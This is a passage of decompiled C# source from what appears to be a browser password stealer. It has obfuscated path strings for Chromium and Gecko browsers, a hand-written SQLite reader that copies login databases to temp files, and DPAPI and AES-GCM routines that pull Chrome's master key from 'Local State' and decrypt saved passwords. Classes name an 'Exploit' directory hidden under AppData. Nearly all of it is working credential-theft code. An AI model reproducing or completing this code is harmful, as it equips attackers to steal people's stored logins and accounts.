						183,
						94,
						93,
						153,
						52,
						180,
						166
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						127,
						26,
						51,
						8,
						51,
						33,
						160,
						156,
						24,
						156,
						118,
						176,
						53,
						117,
						49,
						254,
						byte.MaxValue,
						109,
						181,
						189,
						202,
						185,
						182,
						67,
						39,
						65,
						51,
						52,
						173,
						18,
						238,
						176
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						199,
						54,
						29,
						56,
						170,
						241,
						14,
						100,
						162,
						6,
						72,
						161,
						113,
						24,
						82,
						202,
						17,
						115,
						136,
						234,
						7,
						212,
						113,
						6,
						151,
						135,
						75,
						247,
						247,
						173,
						203,
						24
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						83,
						72,
						133,
						227,
						83,
						110,
						30,
						229,
						236,
						41,
						214,
						6,
						199,
						29,
						46,
						177,
						241,
						54,
						120,
						70,
						151,
						178,
						31,
						141,
						61,
						90,
						213,
						35,
						23,
						246,
						13,
						83
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						104,
						246,
						234,
						64,
						237,
						165,
						148,
						53,
						5,
						137,
						111,
						113,
						171,
						60,
						134,
						245,
						123,
						46,
						6,
						132,
						64,
						48,
						18,
						15,
						251,
						4,
						115,
						37,
						170,
						131,
						50,
						128
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						133,
						151,
						179,
						byte.MaxValue,
						133,
						211,
						180,
						66,
						84,
						153,
						153,
						102,
						25,
						119,
						175,
						75,
						37,
						11,
						232,
						242,
						215,
						134,
						15,
						104,
						97,
						24,
						243,
						15,
						72,
						21,
						214,
						148
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						101,
						40,
						56,
						105,
						89,
						211,
						223,
						54,
						3,
						104,
						25,
						89,
						1,
						122,
						183,
						190,
						84,
						174,
						204,
						213,
						56,
						142,
						216,
						145,
						19,
						148,
						221,
						119,
						63,
						0,
						14,
						109
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						175,
						246,
						73,
						246,
						49,
						254,
						11,
						23,
						218,
						203,
						11,
						198,
						89,
						205,
						176,
						84,
						56,
						68,
						227,
						191,
						99,
						91,
						219,
						129,
						239,
						50,
						148,
						130,
						220,
						188,
						164,
						21
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						75,
						24,
						125,
						65,
						43,
						53,
						196,
						162,
						16,
						125,
						167,
						152,
						46,
						91,
						169,
						88,
						249,
						110,
						125,
						80,
						24,
						9,
						189,
						218,
						64,
						40,
						44,
						44,
						182,
						21,
						14,
						72,
						150,
						141,
						179,
						43,
						1,
						75,
						180,
						171,
						191,
						237,
						98,
						81,
						222,
						4,
						48,
						130
					})
				};

				// Token: 0x040000D1 RID: 209
				public static string[] sGeckoBrowserPaths = new string[]
				{
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						25,
						165,
						254,
						213,
						23,
						104,
						22,
						140,
						50,
						180,
						13,
						111,
						144,
						203,
						43,
						22,
						130,
						192,
						203,
						173,
						216,
						174,
						203,
						198,
						119,
						247,
						195,
						48,
						28,
						15,
						102,
						251
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						57,
						61,
						215,
						94,
						116,
						76,
						131,
						196,
						108,
						135,
						85,
						159,
						219,
						37,
						127,
						47
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						131,
						14,
						byte.MaxValue,
						168,
						2,
						46,
						205,
						11,
						17,
						125,
						39,
						71,
						131,
						241,
						39,
						192
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						78,
						198,
						187,
						164,
						195,
						98,
						111,
						181,
						201,
						137,
						136,
						6,
						94,
						66,
						48,
						57
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						15,
						197,
						238,
						219,
						54,
						25,
						176,
						66,
						84,
						247,
						8,
						76,
						207,
						35,
						202,
						142,
						147,
						45,
						233,
						227,
						100,
						60,
						238,
						136,
						160,
						192,
						140,
						59,
						107,
						214,
						244,
						202
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						153,
						86,
						193,
						227,
						188,
						184,
						28,
						41,
						79,
						37,
						113,
						236,
						3,
						244,
						237,
						150,
						134,
						53,
						212,
						66,
						69,
						82,
						197,
						61,
						225,
						15,
						130,
						151,
						189,
						246,
						126,
						205
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						196,
						189,
						143,
						56,
						114,
						249,
						19,
						12,
						92,
						176,
						156,
						66,
						203,
						221,
						53,
						72,
						131,
						177,
						110,
						160,
						95,
						218,
						63,
						31,
						217,
						46,
						132,
						4,
						211,
						175,
						216,
						239
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						156,
						253,
						178,
						143,
						188,
						39,
						142,
						60,
						241,
						99,
						247,
						116,
						211,
						99,
						5,
						119,
						40,
						243,
						72,
						59,
						0,
						175,
						243,
						243,
						94,
						202,
						67,
						206,
						126,
						176,
						47,
						182,
						145,
						87,
						37,
						85,
						76,
						138,
						57,
						238,
						162,
						167,
						29,
						248,
						230,
						180,
						133,
						57
					})
				};

				// Token: 0x040000D2 RID: 210
				public static string EdgePath = Program.Passwords.StringsCrypt.Decrypt(new byte[]
				{
					156,
					195,
					223,
					143,
					60,
					17,
					189,
					byte.MaxValue,
					52,
					135,
					177,
					35,
					20,
					86,
					6,
					119,
					131,
					100,
					33,
					246,
					174,
					234,
					146,
					72,
					65,
					90,
					212,
					244,
					233,
					203,
					145,
					176
				});

				// Token: 0x040000D3 RID: 211
				public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

				// Token: 0x040000D4 RID: 212
				public static string lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			}

			// Token: 0x0200002C RID: 44
			public struct Password
			{
				// Token: 0x17000008 RID: 8
				// (get) Token: 0x060000A6 RID: 166 RVA: 0x0000292F File Offset: 0x00000B2F
				// (set) Token: 0x060000A7 RID: 167 RVA: 0x00002937 File Offset: 0x00000B37
				public string sUrl { get; set; }

				// Token: 0x17000009 RID: 9
				// (get) Token: 0x060000A8 RID: 168 RVA: 0x00002940 File Offset: 0x00000B40
				// (set) Token: 0x060000A9 RID: 169 RVA: 0x00002948 File Offset: 0x00000B48
				public string sUsername { get; set; }

				// Token: 0x1700000A RID: 10
				// (get) Token: 0x060000AA RID: 170 RVA: 0x00002951 File Offset: 0x00000B51
				// (set) Token: 0x060000AB RID: 171 RVA: 0x00002959 File Offset: 0x00000B59
				public string sPassword { get; set; }
			}

			// Token: 0x0200002D RID: 45
			internal class SQLite
			{
				// Token: 0x060000AC RID: 172 RVA: 0x000066AC File Offset: 0x000048AC
				public SQLite(string fileName)
				{
					this._fileBytes = File.ReadAllBytes(fileName);
					this._pageSize = this.ConvertToULong(16, 2);
					this._dbEncoding = this.ConvertToULong(56, 4);
					this.ReadMasterTable(100L);
				}

				// Token: 0x060000AD RID: 173 RVA: 0x0000670C File Offset: 0x0000490C
				public string GetValue(int rowNum, int field)
				{
					string result;
					try
					{
						if (rowNum >= this._tableEntries.Length)
						{
							result = null;
						}
						else
						{
							result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
						}
					}
					catch
					{
						result = "";
					}
					return result;
				}

				// Token: 0x060000AE RID: 174 RVA: 0x00002962 File Offset: 0x00000B62
				public int GetRowCount()
				{
					return this._tableEntries.Length;
				}

				// Token: 0x060000AF RID: 175 RVA: 0x00006774 File Offset: 0x00004974
				private bool ReadTableFromOffset(ulong offset)
				{
					bool result;
					try
					{
						if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
						{
							uint num = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
							int num2 = 0;
							if (this._tableEntries != null)
							{
								num2 = this._tableEntries.Length;
								Array.Resize<Program.Passwords.SQLite.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
							}
							else
							{
								this._tableEntries = new Program.Passwords.SQLite.TableEntry[num + 1U];
							}
							for (uint num3 = 0U; num3 <= num; num3 += 1U)
							{
								ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
								if (offset != 100UL)
								{
									num4 += offset;
								}
								int num5 = this.Gvl((int)num4);
								this.Cvl((int)num4, num5);
								int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
								this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
								ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
								int num8 = this.Gvl((int)num7);
								int num9 = num8;
								long num10 = this.Cvl((int)num7, num8);
								Program.Passwords.SQLite.RecordHeaderField[] array = null;
								long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
								int num12 = 0;
								while (num11 < num10)
								{
									Array.Resize<Program.Passwords.SQLite.RecordHeaderField>(ref array, num12 + 1);
									int num13 = num9 + 1;
									num9 = this.Gvl(num13);
									array[num12].Type = this.Cvl(num13, num9);
									array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!Program.Passwords.SQLite.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
									num11 = num11 + (long)(num9 - num13) + 1L;
									num12++;
								}
								if (array != null)
								{
									this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
									int num14 = 0;
									for (int i = 0; i <= array.Length - 1; i++)
									{
										if (array[i].Type > 9L)
										{
											if (!Program.Passwords.SQLite.IsOdd(array[i].Type))
											{
												if (this._dbEncoding == 1UL)
												{
													this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
												}
												else if (this._dbEncoding == 2UL)
												{
													this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
												}
												else if (this._dbEncoding == 3UL)
												{
													this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
												}
											}
											else
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
										}
										else
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
										}
										num14 += (int)array[i].Size;
									}
								}
							}
						}
						else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
						{
							uint num15 = (uint)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
							for (uint num16 = 0U; num16 <= num15; num16 += 1U)
							{
								uint num17 = (uint)this.ConvertToULong((int)offset + 12 + (int)(num16 * 2U), 2);
								this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num17), 4) - 1UL) * this._pageSize);
							}
							this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
						}
						result = true;
					}
					catch
					{
						result = false;
					}
					return result;
				}

				// Token: 0x060000B0 RID: 176 RVA: 0x00006BE0 File Offset: 0x00004DE0
				private void ReadMasterTable(long offset)
				{
					try
					{
						byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
						if (b != 5)
						{
							if (b == 13)
							{
								ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
								int num2 = 0;
								if (this._masterTableEntries != null)
								{
									num2 = this._masterTableEntries.Length;
									Array.Resize<Program.Passwords.SQLite.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
								}
								else
								{
									this._masterTableEntries = new Program.Passwords.SQLite.SqliteMasterEntry[num + 1UL];
								}
								for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
								{
									ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
									if (offset != 100L)
									{
										num4 += (ulong)offset;
									}
									int num5 = this.Gvl((int)num4);
									this.Cvl((int)num4, num5);
									int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
									this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
									ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
									int num8 = this.Gvl((int)num7);
									int num9 = num8;
									long num10 = this.Cvl((int)num7, num8);
									long[] array = new long[5];
									for (int i = 0; i <= 4; i++)
									{
										int startIdx = num9 + 1;
										num9 = this.Gvl(startIdx);
										array[i] = this.Cvl(startIdx, num9);
										array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!Program.Passwords.SQLite.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
									}
									if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
									{
										if (this._dbEncoding == 1UL)
										{
											this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
										}
										else if (this._dbEncoding == 2UL)
										{
											this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
										}
										else if (this._dbEncoding == 3UL)
										{
											this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
										}
									}
									this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
									if (this._dbEncoding == 1UL)
									{
										this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									}
									else if (this._dbEncoding == 2UL)
									{
										this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									}
									else if (this._dbEncoding == 3UL)
									{
										this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									}
								}
							}
						}
						else
						{
							uint num11 = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
							for (int j = 0; j <= (int)num11; j++)
							{
								uint num12 = (uint)this.ConvertToULong((int)offset + 12 + j * 2, 2);
								if (offset == 100L)
								{
									this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
								}
								else
								{
									this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
								}
							}
							this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
						}
					}
					catch
					{
					}
				}

				// Token: 0x060000B1 RID: 177 RVA: 0x0000702C File Offset: 0x0000522C
				public bool ReadTable(string tableName)
				{
					bool result;
					try
					{
						int num = -1;
						for (int i = 0; i <= this._masterTableEntries.Length; i++)
						{
							if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
							{
								num = i;
								break;
							}
						}
						if (num == -1)
						{
							result = false;
						}
						else
						{
							string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
							{
								','
							});
							for (int j = 0; j <= array.Length - 1; j++)
							{
								array[j] = array[j].TrimStart(new char[0]);
								int num2 = array[j].IndexOf(' ');
								if (num2 > 0)
								{
									array[j] = array[j].Substring(0, num2);
								}
								if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
								{
									Array.Resize<string>(ref this._fieldNames, j + 1);
									this._fieldNames[j] = array[j];
								}
							}
							result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
						}
					}
					catch
					{
						result = false;
					}
					return result;
				}

				// Token: 0x060000B2 RID: 178 RVA: 0x00007180 File Offset: 0x00005380
				private ulong ConvertToULong(int startIndex, int size)
				{
					ulong result;
					try
					{
						if (size > 8 | size == 0)
						{
							result = 0UL;
						}
						else
						{
							ulong num = 0UL;
							for (int i = 0; i <= size - 1; i++)
							{
								num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
							}
							result = num;
						}
					}
					catch
					{
						result = 0UL;
					}
					return result;
				}

				// Token: 0x060000B3 RID: 179 RVA: 0x000071DC File Offset: 0x000053DC
				private int Gvl(int startIdx)
				{
					int result;
					try
					{
						if (startIdx > this._fileBytes.Length)
						{
							result = 0;
						}
						else
						{
							for (int i = startIdx; i <= startIdx + 8; i++)
							{
								if (i > this._fileBytes.Length - 1)
								{
									return 0;
								}
								if ((this._fileBytes[i] & 128) != 128)
								{
									return i;
								}
							}
							result = startIdx + 8;
						}
					}
					catch
					{
						result = 0;
					}
					return result;
				}

				// Token: 0x060000B4 RID: 180 RVA: 0x0000724C File Offset: 0x0000544C
				private long Cvl(int startIdx, int endIdx)
				{
					long result;
					try
					{
						endIdx++;
						byte[] array = new byte[8];
						int num = endIdx - startIdx;
						bool flag = false;
						if (num == 0 | num > 9)
						{
							result = 0L;
						}
						else if (num == 1)
						{
							array[0] = (this._fileBytes[startIdx] & 127);
							result = BitConverter.ToInt64(array, 0);
						}
						else
						{
							if (num == 9)
							{
								flag = true;
							}
							int num2 = 1;
							int num3 = 7;
							int num4 = 0;
							if (flag)
							{
								array[0] = this._fileBytes[endIdx - 1];
								endIdx--;
								num4 = 1;
							}
							for (int i = endIdx - 1; i >= startIdx; i += -1)
							{
								if (i - 1 >= startIdx)
								{
									array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
									num2++;
									num4++;
									num3--;
								}
								else if (!flag)
								{
									array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
								}
							}
							result = BitConverter.ToInt64(array, 0);
						}
					}
					catch
					{
						result = 0L;
					}
					return result;
				}

				// Token: 0x060000B5 RID: 181 RVA: 0x0000296C File Offset: 0x00000B6C
				private static bool IsOdd(long value)
				{
					return (value & 1L) == 1L;
				}

				// Token: 0x040000D8 RID: 216
				private readonly byte[] _sqlDataTypeSize = new byte[]
				{
					0,
					1,
					2,
					3,
					4,
					6,
					8,
					8,
					0,
					0
				};

				// Token: 0x040000D9 RID: 217
				private readonly ulong _dbEncoding;

				// Token: 0x040000DA RID: 218
				private readonly byte[] _fileBytes;

				// Token: 0x040000DB RID: 219
				private readonly ulong _pageSize;

				// Token: 0x040000DC RID: 220
				private string[] _fieldNames;

				// Token: 0x040000DD RID: 221
				private Program.Passwords.SQLite.SqliteMasterEntry[] _masterTableEntries;

				// Token: 0x040000DE RID: 222
				private Program.Passwords.SQLite.TableEntry[] _tableEntries;

				// Token: 0x0200002E RID: 46
				private struct RecordHeaderField
				{
					// Token: 0x040000DF RID: 223
					public long Size;

					// Token: 0x040000E0 RID: 224
					public long Type;
				}

				// Token: 0x0200002F RID: 47
				private struct TableEntry
				{
					// Token: 0x040000E1 RID: 225
					public string[] Content;
				}

				// Token: 0x02000030 RID: 48
				private struct SqliteMasterEntry
				{
					// Token: 0x040000E2 RID: 226
					public string ItemName;

					// Token: 0x040000E3 RID: 227
					public long RootNum;

					// Token: 0x040000E4 RID: 228
					public string SqlStatement;
				}
			}

			// Token: 0x02000031 RID: 49
			internal sealed class SqlReader
			{
				// Token: 0x060000B6 RID: 182 RVA: 0x0000736C File Offset: 0x0000556C
				public static Program.Passwords.SQLite ReadTable(string database, string table)
				{
					if (!File.Exists(database))
					{
						return null;
					}
					string text = Path.GetTempFileName() + ".dat";
					File.Copy(database, text);
					Program.Passwords.SQLite sqlite = new Program.Passwords.SQLite(text);
					sqlite.ReadTable(table);
					File.Delete(text);
					if (sqlite.GetRowCount() == 65536)
					{
						return null;
					}
					return sqlite;
				}
			}

			// Token: 0x02000032 RID: 50
			internal sealed class Crypto
			{
				// Token: 0x060000B8 RID: 184
				[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
				private static extern bool CryptUnprotectData(ref Program.Passwords.Crypto.DataBlob pCipherText, ref string pszDescription, ref Program.Passwords.Crypto.DataBlob pEntropy, IntPtr pReserved, ref Program.Passwords.Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Program.Passwords.Crypto.DataBlob pPlainText);

				// Token: 0x060000B9 RID: 185 RVA: 0x000073C0 File Offset: 0x000055C0
				public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
				{
					Program.Passwords.Crypto.DataBlob dataBlob = default(Program.Passwords.Crypto.DataBlob);
					Program.Passwords.Crypto.DataBlob dataBlob2 = default(Program.Passwords.Crypto.DataBlob);
					Program.Passwords.Crypto.DataBlob dataBlob3 = default(Program.Passwords.Crypto.DataBlob);
					Program.Passwords.Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Program.Passwords.Crypto.CryptprotectPromptstruct
					{
						cbSize = Marshal.SizeOf(typeof(Program.Passwords.Crypto.CryptprotectPromptstruct)),
						dwPromptFlags = 0,
						hwndApp = IntPtr.Zero,
						szPrompt = null
					};
					string empty = string.Empty;
					try
					{
						try
						{
							if (bCipher == null)
							{
								bCipher = new byte[0];
							}
							dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
							dataBlob2.cbData = bCipher.Length;
							Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
						}
						catch
						{
						}
						try
						{
							if (bEntropy == null)
							{
								bEntropy = new byte[0];
							}
							dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
							dataBlob3.cbData = bEntropy.Length;
							Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
						}
						catch
						{
						}
						Program.Passwords.Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
						byte[] array = new byte[dataBlob.cbData];
						Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
						return array;
					}
					catch
					{
					}
					finally
					{
						if (dataBlob.pbData != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(dataBlob.pbData);
						}
						if (dataBlob2.pbData != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(dataBlob2.pbData);
						}
						if (dataBlob3.pbData != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(dataBlob3.pbData);
						}
					}
					return new byte[0];
				}

				// Token: 0x060000BA RID: 186 RVA: 0x00007580 File Offset: 0x00005780
				public static byte[] GetMasterKey(string sLocalStateFolder)
				{
					string text;
					if (sLocalStateFolder.Contains("Opera"))
					{
						text = sLocalStateFolder + "\\Opera Stable\\Local State";
					}
					else
					{
						text = sLocalStateFolder + "\\Local State";
					}
					byte[] array = new byte[0];
					if (!File.Exists(text))
					{
						return null;
					}
					if (text != Program.Passwords.Crypto.sPrevBrowserPath)
					{
						Program.Passwords.Crypto.sPrevBrowserPath = text;
						MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text));
						foreach (object obj in matchCollection)
						{
							Match match = (Match)obj;
							if (match.Success)
							{
								array = Convert.FromBase64String(match.Groups[1].Value);
							}
						}
						byte[] array2 = new byte[array.Length - 5];
						Array.Copy(array, 5, array2, 0, array.Length - 5);
						byte[] result;
						try
						{
							Program.Passwords.Crypto.sPrevMasterKey = Program.Passwords.Crypto.DPAPIDecrypt(array2, null);
							result = Program.Passwords.Crypto.sPrevMasterKey;
						}
						catch
						{
							result = null;
						}
						return result;
					}
					return Program.Passwords.Crypto.sPrevMasterKey;
				}

				// Token: 0x060000BB RID: 187 RVA: 0x00003DBC File Offset: 0x00001FBC
				public static string GetUTF8(string sNonUtf8)
				{
					string result;
					try
					{
						byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
						result = Encoding.UTF8.GetString(bytes);
					}
					catch
					{
						result = sNonUtf8;
					}
					return result;
				}

				// Token: 0x060000BC RID: 188 RVA: 0x00003DFC File Offset: 0x00001FFC
				public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
				{
					byte[] array = new byte[12];
					byte[] array2 = array;
					Array.Copy(bEncryptedData, 3, array2, 0, 12);
					byte[] result;
					try
					{
						byte[] array3 = new byte[bEncryptedData.Length - 15];
						Array.Copy(bEncryptedData, 15, array3, 0, bEncryptedData.Length - 15);
						byte[] array4 = new byte[16];
						byte[] array5 = new byte[array3.Length - array4.Length];
						Array.Copy(array3, array3.Length - 16, array4, 0, 16);
						Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
						Program.cAesGcm cAesGcm = new Program.cAesGcm();
						result = cAesGcm.Decrypt(bMasterKey, array2, null, array5, array4);
					}
					catch (Exception value)
					{
						Console.WriteLine(value);
						result = null;
					}
					return result;
				}

				// Token: 0x060000BD RID: 189 RVA: 0x000076A4 File Offset: 0x000058A4
				public static string EasyDecrypt(string sLoginData, string sPassword)
				{
					if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
					{
						byte[] masterKey = Program.Passwords.Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
						return Encoding.Default.GetString(Program.Passwords.Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
					}
					return Encoding.Default.GetString(Program.Passwords.Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
				}

				// Token: 0x040000E5 RID: 229
				private static string sPrevBrowserPath = "";

				// Token: 0x040000E6 RID: 230
				private static byte[] sPrevMasterKey = new byte[0];

				// Token: 0x02000033 RID: 51
				[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
				private struct CryptprotectPromptstruct
				{
					// Token: 0x040000E7 RID: 231
					public int cbSize;

					// Token: 0x040000E8 RID: 232
					public int dwPromptFlags;

					// Token: 0x040000E9 RID: 233
					public IntPtr hwndApp;

					// Token: 0x040000EA RID: 234
					public string szPrompt;
				}

				// Token: 0x02000034 RID: 52
				[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
				private struct DataBlob
				{
					// Token: 0x040000EB RID: 235
					public int cbData;

					// Token: 0x040000EC RID: 236
					public IntPtr pbData;
				}
			}

			// Token: 0x02000035 RID: 53
			private class Handler
			{
				// Token: 0x040000ED RID: 237
				public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

				// Token: 0x040000EE RID: 238
				public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

				// Token: 0x040000EF RID: 239
				public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

				// Token: 0x040000F0 RID: 240
				public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

				// Token: 0x040000F1 RID: 241
				public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

				// Token: 0x040000F2 RID: 242
				public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

				// Token: 0x040000F3 RID: 243
				public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

				// Token: 0x040000F4 RID: 244
				public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

				// Token: 0x040000F5 RID: 245
				public static readonly string ExploitDirectory = Path.GetDirectoryName(Program.Passwords.Handler.ExploitName);

				// Token: 0x040000F6 RID: 246
				public static string[] SysPatch = new string[]
				{
					Program.Passwords.Handler.AppData,
					Program.Passwords.Handler.LocalData,
					Program.Passwords.Handler.CommonData
				};

				// Token: 0x040000F7 RID: 247
				public static string zxczxczxc = Program.Passwords.Handler.SysPatch[new Random().Next(0, Program.Passwords.Handler.SysPatch.Length)];

				// Token: 0x040000F8 RID: 248
				public static string ExploitDir = Program.Passwords.Handler.zxczxczxc + "\\AIO";

				// Token: 0x040000F9 RID: 249
				public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

				// Token: 0x040000FA RID: 250
				public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
			}

			// Token: 0x02000036 RID: 54
			public static class cBCrypt
			{
				// Token: 0x060000C2 RID: 194
				[DllImport("bcrypt.dll")]
				public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

				// Token: 0x060000C3 RID: 195
				[DllImport("bcrypt.dll")]
				public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

				// Token: 0x060000C4 RID: 196
				[DllImport("bcrypt.dll")]
				public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

